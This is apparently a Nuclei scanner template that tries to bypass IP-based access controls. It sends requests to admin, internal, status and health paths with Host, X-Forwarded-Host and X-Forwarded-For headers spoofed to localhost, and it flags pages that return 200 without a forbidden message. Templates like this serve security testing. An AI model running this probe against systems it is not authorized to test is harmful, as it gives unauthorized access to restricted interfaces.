id: m7-host-header-routing
info:
  name: M7 - Host Header Internal Routing Bypass
  author: Sharlix
  severity: high
  description: Bypass IP-based access controls via Host header manipulation
  tags: host-header,routing,bypass,m7hunter

requests:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/internal"
      - "{{BaseURL}}/status"
      - "{{BaseURL}}/health"

    headers:
      Host: "localhost"
      X-Forwarded-Host: "localhost"
      X-Forwarded-For: "127.0.0.1"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: dsl
        dsl:
          - "!contains(body, '403') && !contains(body, 'forbidden')"
